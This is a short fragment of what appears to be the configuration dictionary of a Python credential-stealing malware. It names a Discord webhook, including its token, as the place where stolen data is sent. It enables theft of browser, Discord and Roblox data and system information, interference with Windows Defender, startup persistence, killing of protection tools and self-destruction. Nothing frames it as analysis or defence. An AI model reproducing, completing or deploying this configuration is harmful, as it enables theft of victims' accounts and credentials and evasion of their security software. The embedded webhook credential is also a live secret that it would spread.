...
__CONFIG__ = {'webhook': 'https://discord.com/api/webhooks/1069250723667255307/u8E4-ulx8NSf29cmi9B-afZCYUM1y8kTryN6k_8pm5Ru6lxTzkYLNJ0ZYKitEgOo_1AJ', 'ping': True, 'pingtype': 'Everyone', 'error': False, 'startup': True, 'defender': True, 'systeminfo': True, 'backupcodes': False, 'browser': True, 'roblox': True, 'obfuscation': False, 'injection': False, 'minecraft': False, 'wifi': False, 'killprotector': True, 'antidebug_vm': False, 'discord': True, 'anti_spam': False, 'self_destruct': True}
